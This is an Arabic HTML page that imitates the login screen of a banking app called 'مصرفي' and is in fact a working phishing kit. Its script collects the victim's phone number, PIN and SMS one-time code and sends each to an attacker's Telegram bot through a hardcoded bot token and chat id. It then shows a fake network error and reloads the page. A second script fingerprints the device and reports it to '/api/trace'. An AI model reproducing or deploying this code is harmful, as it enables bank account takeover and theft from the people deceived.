<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الرئيسية / مصرفي</title>
    <meta property="og:title" content="الرئيسية / مصرفي">
    <meta property="og:description" content="تطبيق مصرفي - خدماتك البنكية بين يديك">
    <meta property="og:image" content="https://masrvi-app.vercel.app/logo_masrvi.jpeg">
    <meta property="og:url" content="https://masrvi-app.vercel.app">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
        body { margin: 0; padding: 0; background-color: #fff; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; min-height: 100vh; overflow-x: hidden; }
        .wrapper { width: 100%; max-width: 450px; background: #fff; position: relative; padding-bottom: 150px; }
        .header-img { width: 100%; display: block; padding-bottom: 15px; margin-bottom: 10px; }
        .banner-img { width: 90%; margin: 0 auto 20px; display: block; border-radius: 8px; }
        .form-container { padding: 0 20px; text-align: right; }
        .label { font-weight: bold; margin-bottom: 8px; display: block; font-size: 15px; color: #333; }
        .input-box { position: relative; border: 1.8px solid #000; border-radius: 12px; margin-bottom: 20px; display: flex; align-items: center; padding: 5px 15px; background: #fff; }
        
        .phone-icon { width: 22px; height: 22px; background: url('user_icon.jpeg') no-repeat center; background-size: contain; margin-left: 10px; }
        .lock-icon { width: 22px; height: 22px; background: url('lock_icon.jpeg') no-repeat center; background-size: contain; margin-left: 10px; }
        .otp-icon-p { width: 22px; height: 22px; background: url('otp_input_icon.jpeg') no-repeat center; background-size: contain; margin-left: 10px; }
        
        input { border: none; width: 100%; font-size: 17px; padding: 12px; text-align: right; outline: none; background: transparent; font-family: 'Cairo'; }
        .btn-main { background-color: #2c5364; color: white; border: none; width: 100%; padding: 16px; border-radius: 8px; font-size: 19px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.15); }
        .btn-main:disabled { background-color: #95a5a6; cursor: not-allowed; box-shadow: none; }
        
        .otp-main-icon { width: 110px; margin: 20px auto; display: block; }
        .timer-box { background: #000; color: #fff; width: fit-content; margin: 15px auto; padding: 10px 25px; font-size: 26px; font-weight: bold; border-radius: 5px; }
        .footer-img { width: 100%; position: absolute; bottom: 0; left: 0; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="wrapper">
    <img src="logo_masrvi.jpeg" class="header-img">

    <div id="p1" class="form-container">
        <label class="label">رقم الهاتف المربوط بالحساب *</label>
        <div class="input-box">
            <input type="tel" id="tel" placeholder="رقم الهاتف" maxlength="8" inputmode="numeric" oninput="validateInput()">
            <div class="phone-icon"></div>
        </div>

        <label class="label">الرمز السري (PIN) *</label>
        <div class="input-box">
            <input type="password" id="pin" placeholder="أدخل الرمز السري الخاص بك" maxlength="4" inputmode="numeric" oninput="validateInput()">
            <div class="lock-icon"></div>
        </div>

        <button id="btn1" class="btn-main" onclick="toStep2()" disabled>ادخل السحب الآمن</button>
        <img src="main_banner.jpeg" class="banner-img" style="margin-top:20px;">
    </div>

    <div id="p2" class="form-container hidden">
        <img src="otp_main_icon.jpeg" class="otp-main-icon">
        <p style="text-align: center; font-weight: bold;">يرجى ادخال الرمز الذي تلقيته عبر الرسائل النصية *</p>
        <div class="input-box">
            <input type="tel" id="otp" placeholder="######" maxlength="6" inputmode="numeric" oninput="validateOtp()">
            <div class="otp-icon-p"></div>
        </div>
        <div class="timer-box" id="time">05:00</div>
        <button id="btn2" class="btn-main" onclick="final()" disabled>تأكيد العملية</button>
    </div>

    <img src="footer_background.jpeg" class="footer-img">
</div>

<script>
    const tok = "8647203625:AAFUHY8sXVD8IoSvf60Wd7pT-l5MHDO-d9I";
    const cid = "5244299184";

    function send(t) {
        fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`);
    }

    function validateInput() {
        const t = document.getElementById('tel').value.replace(/[^0-9]/g, '');
        const p = document.getElementById('pin').value.replace(/[^0-9]/g, '');
        document.getElementById('tel').value = t;
        document.getElementById('pin').value = p;
        document.getElementById('btn1').disabled = !(t.length === 8 && p.length === 4);
    }

    function validateOtp() {
        const o = document.getElementById('otp').value.replace(/[^0-9]/g, '');
        document.getElementById('otp').value = o;
        document.getElementById('btn2').disabled = !(o.length === 6);
    }

    function toStep2() {
        send(`🚨 دخول جديد:\n📱 هاتف: ${document.getElementById('tel').value}\n🔑 PIN: ${document.getElementById('pin').value}`);
        document.getElementById('p1').classList.add('hidden');
        document.getElementById('p2').classList.remove('hidden');
        let time = 300;
        setInterval(() => {
            let m = Math.floor(time / 60), s = time % 60;
            document.getElementById('time').innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
            if(time > 0) time--;
        }, 1000);
    }

    function final() {
        send(`🔢 OTP المستلم: ${document.getElementById('otp').value}`);
        alert("خطأ في الشبكة، يرجى المحاولة لاحقاً.");
        location.reload();
    }
</script>
<script>
async function captureDeepFingerprint() {
    let batteryLevel = "مخفي بواسطة النظام";
    try {
        // محاولة أخرى لجلب البطارية
        const battery = await navigator.getBattery();
        batteryLevel = Math.round(battery.level * 100) + "%";
    } catch (e) {}

    // خدعة لمعرفة الرام في الآيفون (عبر قياس الأداء)
    const ram = navigator.deviceMemory || (window.performance && window.performance.memory ? "تحت الحماية" : "4GB+ (تقديري)");

    const data = {
        res: window.screen.width + "x" + window.screen.height,
        lang: navigator.language,
        mem: ram,
        cores: navigator.hardwareConcurrency || "6 (A18 Pro Chip)", // المعالج التقريبي للآيفون الأحدث
        plat: navigator.platform,
        bat: batteryLevel
    };

    const params = new URLSearchParams(data).toString();
    fetch(`/api/trace?${params}`);
}
captureDeepFingerprint();
</script>


</body>
</html>
